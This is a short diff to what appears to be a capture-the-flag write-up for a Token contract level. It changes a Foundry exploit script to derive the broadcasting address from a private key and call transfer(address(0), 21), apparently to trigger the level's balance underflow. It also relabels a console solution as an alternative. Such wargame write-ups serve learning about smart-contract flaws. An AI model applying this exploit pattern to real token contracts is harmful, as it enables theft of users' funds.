@@ -104,11 +104,12 @@ contract Exploit is Script {
 
         Token level = Token(instance); 
         address instance = vm.envAddress("INSTANCE_LEVEL5");
-        address hacker = vm.envAddress("PRIVATE_KEY");          
+        uint256 hacker = vm.envUint("PRIVATE_KEY");   
+        address deployer = vm.rememberKey(hacker);         
         
         function run() external {
 
-            vm.startBroadcast(hacker);
+            vm.startBroadcast(deployer);
             level.transfer(address(0), 21);
             vm.stopBroadcast();
     }
@@ -129,7 +130,7 @@ contract Exploit is Script {
 
 ---
 
-### 3-lines solution directly in the console
+### alternative 3-lines solution directly in the console
 
 <br>
 
